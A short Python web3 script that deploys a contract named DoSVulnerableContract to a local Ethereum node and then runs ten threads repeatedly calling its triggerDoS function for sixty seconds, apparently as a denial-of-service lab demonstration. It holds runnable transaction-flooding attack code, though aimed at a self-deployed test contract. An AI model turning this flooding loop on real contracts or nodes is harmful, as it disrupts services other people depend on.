from web3 import Web3
import json
import threading
import time

# Connect to Ethereum node
w3 = Web3(Web3.HTTPProvider('http://localhost:8545'))

# Load vulnerable contract ABI and bytecode
with open('DoSVulnerableContract.json') as f:
    contract_data = json.load(f)
vulnerable_abi = contract_data['abi']
vulnerable_bytecode = contract_data['bytecode']

# Deploy vulnerable contract
def deploy_contract(abi, bytecode):
    contract = w3.eth.contract(abi=abi, bytecode=bytecode)
    tx_hash = contract.constructor().transact()
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return w3.eth.contract(address=tx_receipt.contractAddress, abi=abi)

vulnerable_contract = deploy_contract(vulnerable_abi, vulnerable_bytecode)

# Configuration
NUM_THREADS = 10
REQUESTS_PER_THREAD = 100
ATTACK_DURATION = 60  # Duration of the attack in seconds

# Event to signal threads to stop
stop_event = threading.Event()

def perform_dos_attack(vulnerable_contract):
    def attack():
        while not stop_event.is_set():
            try:
                tx_hash = vulnerable_contract.functions.triggerDoS().transact()
                w3.eth.wait_for_transaction_receipt(tx_hash)
                print(f"Transaction successful: {tx_hash.hex()}")
            except Exception as e:
                print(f"Transaction failed: {e}")
            time.sleep(0.1)  # Small delay between requests

    threads = []
    for i in range(NUM_THREADS):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    # Let the attack run for a specified duration
    time.sleep(ATTACK_DURATION)

    # Signal threads to stop
    stop_event.set()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()
        print("Thread finished.")

if __name__ == "__main__":
    perform_dos_attack(vulnerable_contract)
